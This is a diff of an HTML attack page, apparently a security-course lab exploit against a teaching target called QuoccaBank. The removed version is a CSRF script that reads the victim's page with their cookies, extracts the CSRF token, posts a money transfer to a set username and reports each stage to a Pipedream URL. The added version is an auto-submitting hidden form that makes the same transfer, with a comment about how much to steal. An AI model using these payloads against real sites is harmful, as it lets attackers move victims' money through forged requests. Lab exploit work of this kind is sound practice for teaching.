@@ -1,44 +1,17 @@
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>Auto-Transfer</title></head>
-<body>
-<script>
-/* 1  Notify Pipedream the bot loaded the page */
-(new Image()).src = "https://eok9itjcz7vwbnr.m.pipedream.net/?stage=loaded";
-
-/* 2  Grab the home page (cookies are sent because credentials:"include") */
-fetch("/", {credentials:"include"})
-  .then(r => r.text())
-  .then(html => {
-      /* 3  Extract the current CSRF token */
-      const m = html.match(/name="csrf_token"\s+value="([^"]+)"/);
-      if (!m) throw "Token not found";
-      const token = m[1];
-
-      /* 4  Build x-www-form-urlencoded body */
-      const body = new URLSearchParams({
-        csrf_token: token,
-        username:   "z5640334",   // <- change this
-        amount:     "100"
-      });
-
-      /* 5  Send the transfer */
-      return fetch("/api/transfer", {
-        method: "POST",
-        credentials: "include",
-        headers: {"content-type":"application/x-www-form-urlencoded"},
-        body
-      });
-  })
-  .then(() => {
-      /* 6  Ping again so you know the POST was made */
-      (new Image()).src ="https://eok9itjcz7vwbnr.m.pipedream.net/?stage=transfer";
-  })
-  .catch(err => {
-      (new Image()).src ="https://eok9itjcz7vwbnr.m.pipedream.net/?stage=error&msg="+encodeURIComponent(err);
-  });
-</script>
-<h1>Moving funds… 🤑</h1>
+<html lang="en">
+<head><meta charset="utf-8"><title>free money</title></head>
+<body onload="document.forms[0].submit()">
+  <!-- Change this if QuoccaBank uses a different sub-domain -->
+  <form action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+    <input type="hidden" name="csrf_token" value="MTU2MA==">
+    <!-- YOUR QuoccaBank username here -->
+    <input type="hidden" name="username" value="z5640334">
+    <!-- How much you want to steal -->
+    <input type="hidden" name="amount"   value="100">
+  </form>
+  <p>If you see this text, auto-submit failed – try clicking the big empty space.</p>
 </body>
 </html>
+
 
